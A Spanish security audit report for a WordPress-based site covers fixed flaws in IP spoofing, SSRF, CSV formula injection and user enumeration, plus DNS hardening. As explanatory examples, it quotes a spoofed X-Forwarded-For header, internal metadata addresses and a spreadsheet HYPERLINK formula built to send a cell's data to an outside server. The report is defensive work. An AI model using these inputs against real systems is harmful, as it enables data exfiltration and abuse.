# Seguridad — qué se arregló y qué falta por hacer a mano

Auditoría del 4 de septiembre de 2026: el sitio estático (Next), el plugin
`thallo-visibility`, el tema `thallo-blog`, las cabeceras HTTP y el DNS.

El resumen honesto: **no hay nada explotado ni ninguna puerta abierta de par en
par**. Lo que hay son cuatro fallos reales en el código —uno de ellos serio— y
una capa de configuración defensiva que nunca se puso. Lo del código ya está
arreglado en el repo. Lo de configuración no se puede desplegar desde aquí y va
al final, en la lista de lo que hay que hacer a mano.

---

## 1. Lo que ya está arreglado en el repo

### La suplantación de IP · lo más serio de todo

`Thallo_Vis_DB::client_ip()` leía `CF-Connecting-IP` y `X-Forwarded-For` y se
creía la primera que llegara. Esas dos son cabeceras que escribe quien llama, no
el servidor. WordPress responde en el Apache de Bluehost sin nada delante que
las sobrescriba, así que cualquiera podía mandar `X-Forwarded-For: 1.2.3.4` y
llegar como una persona distinta en cada petición.

Con eso se saltaban de una vez: el cupo de escaneos por visitante, el límite de
cinco consultas al día del formulario, y la lista de IPs exentas de los ajustes
—o sea, si alguien acertaba una IP exenta, escaneos infinitos. El único freno
que quedaba en pie era el tope diario de todo el sitio, que es exactamente el
que protege la factura de las APIs de los modelos.

Ahora se usa `REMOTE_ADDR`, que es la única dirección que el servidor observó
por sí mismo. Las cabeceras de proxy se vuelven a leer sólo si se declara en
`wp-config.php`:

```php
define( 'THALLO_VIS_TRUST_PROXY', true );
```

Eso se activa **únicamente** si algún día ponemos Cloudflare u otro proxy
delante. Hoy no hay ninguno, así que se queda apagado.

### SSRF: el escáner podía apuntar hacia adentro

El formulario valida el dominio con un patrón de nombres de host, y un patrón
de nombres de host no distingue un nombre de un número: `127.0.0.1`,
`192.168.1.1` y `169.254.169.254` lo pasaban todos. Después el crawler hacía
`wp_remote_get()` a esa dirección desde dentro del servidor y reportaba qué
había contestado.

Dos cambios: la petición ahora sale por `wp_safe_remote_get()`, que resuelve el
nombre antes de abrir el socket y rechaza loopback, link-local, direcciones
privadas y cualquier puerto que no sea 80 o 443 —revalidando en cada
redirección— y el formulario rechaza de entrada las IPs literales y los sufijos
reservados (`.local`, `.internal`, `.test`…) con un mensaje en vez de un escaneo
que sale vacío.

### El CSV de leads ejecutaba fórmulas

`brand`, `domain` e `industry` los escribe un desconocido en el formulario. Una
celda que empieza por `=`, `+`, `-` o `@` es una fórmula para Excel, Numbers y
Sheets, y se ejecuta al abrir el archivo. Un nombre de marca como
`=HYPERLINK("https://…"&A1,"Abrir")` manda la fila de al lado al servidor de
otro en cuanto abres el export —y abrir el export es justo para lo que se
exporta.

Ahora esas celdas salen con un apóstrofo delante, que es el "esto es texto" de
la propia hoja de cálculo: no se ve en la celda y no vuelve a la base de datos.

### El blog regalaba el nombre de usuario

`/blog/wp-json/wp/v2/users` contestaba a cualquiera, sin login, con el `slug` de
la cuenta —que en esta instalación es el nombre de login. `?author=1` daba lo
mismo redirigiendo al archivo de autor. Eso es media credencial regalada, y como
el formulario de login de WordPress dice cuándo un usuario existe, la otra mitad
es lo único que quedaba por adivinar.

En `functions.php` del tema: el endpoint responde 401 a quien no está logueado
(el editor de bloques lo lee logueado, así que no se entera de nada), `?author=N`
redirige a la home, XML-RPC queda apagado y se quita la etiqueta que anuncia la
versión exacta de WordPress en cada página.

> XML-RPC apagado significa que **no** funcionarán la app móvil de WordPress,
> Jetpack ni los trackbacks. Si algún día hace falta la app, se borra ese bloque
> y vuelve.

### Lo que se revisó y estaba bien

SQL (todo con `$wpdb->prepare`), escapado en el admin y en las plantillas de
email, nonces y `current_user_can` en las siete acciones del panel, `rel` en
todos los `target="_blank"`, ningún `dangerouslySetInnerHTML` con datos de
usuario (los tres que hay son JSON-LD escrito por nosotras), ningún secreto
commiteado, honeypot y límites en el formulario de contacto, e ids de escaneo de
128 bits reales. Los 160 tests del plugin siguen pasando.

---

## 2. ANTES DE SUBIR NADA: comprobar qué versión corre en producción

Esto ya pasó una vez. En agosto el repo tenía la 1.7.5 y producción corría la
1.10.1 — el zip construido desde el repo era un downgrade y WordPress lo
rechazó, con razón. El código vivo era el bueno y el repo iba quince commits
por detrás.

Desde aquí **no se puede comprobar**: `/thallo/v1/status` pide sesión de
administradora y mod_security bloquea el `readme.txt` del plugin. Lo tienes que
mirar tú, y es un clic:

- **WP → Plugins**, la línea de *Thallo Visibility Engine*, o
- entrar a `https://thallodigital.com/blog/wp-json/thallo/v1/status` con la
  sesión de admin abierta y leer el campo `version`.

Y entonces:

| Lo que diga | Qué hacer |
|---|---|
| **1.10.1** | Todo en orden: el repo es la fuente. Sube el zip 1.10.2. |
| **1.10.2** | Ya está subido. No hay nada que hacer. |
| **Cualquier cosa por encima** | **Para.** Producción va por delante del repo y subir esto perdería lo que haya de más. Dímelo y bajamos el código vivo primero, como se hizo en agosto. |

Lo mismo para el tema, en **WP → Apariencia → Temas** (*Thallo Blog*): el zip
también es 1.10.2.

---

## 3. Lo que hay que subir a mano

Nada de esto lo despliega el push: el plugin y el tema se suben por el panel de
WordPress, y el `.htaccess` se pega en cPanel.

| Qué | Dónde |
|---|---|
| `wordpress-plugin/thallo-visibility.zip` | WP → Plugins → Añadir nuevo → Subir (sobrescribe el instalado) |
| `wordpress-theme/thallo-blog.zip` | WP → Apariencia → Temas → Añadir nuevo → Subir |
| `deploy/security-headers.htaccess` | cPanel → File Manager → `.htaccess` del document root |

Después de subir el plugin y el tema, comprobar que
`https://thallodigital.com/blog/wp-json/wp/v2/users` contesta 401 y que un
escaneo normal sigue funcionando de principio a fin.

---

## 4. DNS

Lo que hay hoy, mirado contra el DNS público:

| Registro | Estado |
|---|---|
| SPF | ✅ `v=spf1 a mx include:_spf.google.com include:websitewelcome.com ~all` |
| DKIM | ✅ Google firma (`google._domainkey`) |
| DMARC | ⚠️ `v=DMARC1; p=none` — existe y no hace nada |
| CAA | ❌ No hay |
| DNSSEC | ❌ Sin DS en el padre |

### DMARC — lo único que vale la pena cambiar ya

`p=none` sin `rua` es lo peor de los dos mundos: no aplica ninguna política y
tampoco manda informes, así que ni protege ni te enteras de quién está mandando
correo con tu dominio. El primer paso no cambia el comportamiento del correo,
sólo enciende la visibilidad:

```
_dmarc.thallodigital.com   TXT   "v=DMARC1; p=none; rua=mailto:BUZÓN@thallodigital.com; fo=1"
```

Ese buzón tiene que existir de verdad en Workspace. Con dos o cuatro semanas de
informes se ve qué manda correo por el dominio; si sale limpio, se pasa a
`p=quarantine` y más adelante a `p=reject`.

Un detalle que importa aquí: los informes del escáner los manda `wp_mail()`
desde el servidor de Bluehost, no desde Google. Esos correos **no** los firma
DKIM —pasan por SPF, gracias a `include:websitewelcome.com`, que ya está. Por
eso hay que confirmarlo con los informes antes de endurecer la política, o los
propios informes de visibilidad empezarán a caer en spam.

### CAA — barato y conviene

Sin CAA, cualquier autoridad certificadora del mundo puede emitir un certificado
para el dominio. El certificado actual lo emite Let's Encrypt (es el AutoSSL de
cPanel):

```
thallodigital.com   CAA   0 issue "letsencrypt.org"
thallodigital.com   CAA   0 issuewild "letsencrypt.org"
thallodigital.com   CAA   0 iodef "mailto:BUZÓN@thallodigital.com"
```

⚠️ **Esto sí tiene consecuencia real si se hace mal.** Si el CAA no incluye a
quien emite de verdad, la próxima renovación falla y el sitio se queda sin
certificado válido. El actual caduca el 4 de noviembre de 2026, así que hay que
poner el registro y **verificar la renovación de AutoSSL antes de esa fecha**.
Si algún día entra Cloudflare de por medio, hay que añadir su emisor aquí antes
de moverla.

### DNSSEC — opcional, y sin prisa

No está activado. Firma las respuestas del DNS para que nadie pueda falsificarlas
por el camino. Bluehost lo ofrece en el panel de dominio, pero es la parte más
fácil de romper de esta lista: si la zona y la firma se desincronizan, el dominio
deja de resolver para todo el mundo, no se ve "roto" sino "no existe", y se
arregla desde el registrador, no desde el sitio.

Yo lo dejaría para después de que DMARC y CAA estén asentados, y con tiempo por
delante para mirarlo, no un viernes.
